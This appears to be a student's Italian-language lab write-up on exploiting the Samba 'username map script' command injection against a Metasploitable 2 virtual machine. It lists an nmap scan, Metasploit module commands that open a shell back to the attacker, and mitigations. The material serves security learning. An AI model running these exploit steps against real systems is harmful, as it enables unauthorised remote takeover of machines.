# Lab: Sfruttamento vulnerabilità Samba con Metasploit

## Obiettivo
Simulare un attacco su una macchina vulnerabile utilizzando Kali Linux e Metasploit, comprendendo il funzionamento della vulnerabilità e le relative mitigazioni.

## Ambiente di laboratorio
- Attaccante: Kali Linux
- Vittima: Metasploitable 2
- Rete: Host-Only

## Scansione
È stata eseguita una scansione con Nmap:

nmap -A <IP_target>

Servizi individuati:
- SMB (Samba)
- FTP
- SSH

## Sfruttamento
È stata sfruttata una vulnerabilità di Samba relativa alla funzionalità "username map script".

Modulo Metasploit utilizzato:
exploit/multi/samba/usermap_script

Comandi eseguiti:
use exploit/multi/samba/usermap_script
set RHOSTS <IP_target>
set LHOST <IP_attaccante>
run

## Spiegazione della vulnerabilità
La vulnerabilità è di tipo Command Injection.

Samba non valida correttamente l'input fornito dall'utente all'interno di uno script. Questo permette a un attaccante di inserire comandi arbitrari che vengono eseguiti dal sistema.

Il risultato è una Remote Code Execution (RCE).

## Impatto
- Accesso remoto senza autenticazione
- Esecuzione di comandi sul sistema
- Compromissione completa della macchina

## Mitigazioni
- Aggiornare Samba a una versione sicura
- Disabilitare la funzionalità "username map script"
- Limitare l'accesso alle porte 139 e 445
- Applicare controlli sugli input

## Evidenze
I risultati della scansione e i passaggi dell'exploit sono disponibili nelle rispettive cartelle.

Questo laboratorio mi ha permesso di comprendere come una vulnerabilità di tipo Command Injection possa portare a Remote Code Execution.
